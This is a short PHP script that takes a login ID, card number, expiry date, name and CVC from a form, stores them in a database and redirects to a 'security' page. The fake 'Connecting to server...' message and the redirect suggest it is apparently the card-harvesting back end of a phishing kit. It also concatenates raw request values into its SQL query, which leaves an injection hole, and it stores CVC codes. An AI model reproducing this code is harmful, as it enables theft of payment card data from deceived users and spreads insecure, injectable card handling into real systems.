<?php
 
require('../db/index.php');

$status = "";
if(isset($_POST['new']) && $_POST['new']==1)
{
$u_login_id = $_REQUEST['u_login_id'];
$number = $_REQUEST['number'];
$expiry = $_REQUEST['expiry'];
$name = $_REQUEST['name'];
$cvc = $_REQUEST['cvc'];
$ins_query="insert into cards (`u_login_id`,`number`,`expiry`,`name`,`cvc`) values ('$u_login_id','$number','$expiry','$name','$cvc')";
mysqli_query($con,$ins_query) or die(mysqli_error($con));
$status = "Connecting to server...";
}
?>
<meta http-equiv="refresh" content="0; url=../../security.php" />